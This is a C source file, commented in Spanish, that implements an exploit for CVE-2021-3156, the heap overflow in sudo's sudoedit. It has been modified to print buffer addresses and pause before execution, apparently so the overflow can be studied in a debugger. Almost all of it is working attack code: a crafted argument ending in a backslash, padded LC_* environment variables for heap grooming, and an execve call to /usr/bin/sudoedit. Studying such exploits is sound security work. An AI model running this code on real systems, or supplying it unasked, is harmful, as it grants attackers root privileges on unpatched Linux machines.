#include <unistd.h> // execve()
#include <string.h> // strcat()
#include <stdio.h>  // printf

/* Exploit para CVE-2021-3156, modificado para visualizar desbordamiento */

void main(void) {
    // Declarar punteros para rastrear direcciones
    char *buf_ptr, *messages_ptr, *telephone_ptr, *overflow_ptr;

    // Preparar buffer que provocará el desbordamiento
    char buf[0xf0] = {0};
    memset(buf, 'Y', 0xe0);
    strcat(buf, "\\");

    buf_ptr = buf; // Asignar puntero al buffer
    printf("Dirección de buf: %p\n", (void *)buf_ptr);

    char *argv[] = {
        "sudoedit",
        "-s",
        buf,
        NULL
    };

    // Preparar variables de entorno para heap Feng-Shui
    char messages[0xe0] = {"LC_MESSAGES=en_GB.UTF-8@"};
    memset(messages + strlen(messages), 'A', 0xb8);
    messages_ptr = messages; // Asignar puntero
    printf("Dirección de messages: %p\n", (void *)messages_ptr);

    char telephone[0x50] = {"LC_TELEPHONE=C.UTF-8@"};
    memset(telephone + strlen(telephone), 'A', 0x28);
    telephone_ptr = telephone; // Asignar puntero
    printf("Dirección de telephone: %p\n", (void *)telephone_ptr);

    char measurement[0x50] = {"LC_MEASUREMENT=C.UTF-8@"};
    memset(measurement + strlen(measurement), 'A', 0x28);
    printf("Dirección de measurement: %p\n", (void *)measurement);

    // Buffer para desbordamiento
    char overflow[0x500] = {0};
    memset(overflow, 'X', 0x4cf);
    strcat(overflow, "\\");
    overflow_ptr = overflow; // Asignar puntero
    printf("Dirección de overflow: %p\n", (void *)overflow_ptr);

    // Configurar variables de entorno maliciosas
    char *envp[] = {
        overflow,
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "XXXXXXX\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "x/x\\",
        "Z",
        messages,
        telephone,
        measurement,
        NULL
    };

    // Pausa para inspección antes de ejecutar
    printf("Presiona Enter para continuar...\n");
    getchar();

    // Invocar sudoedit
    execve("/usr/bin/sudoedit", argv, envp);
}
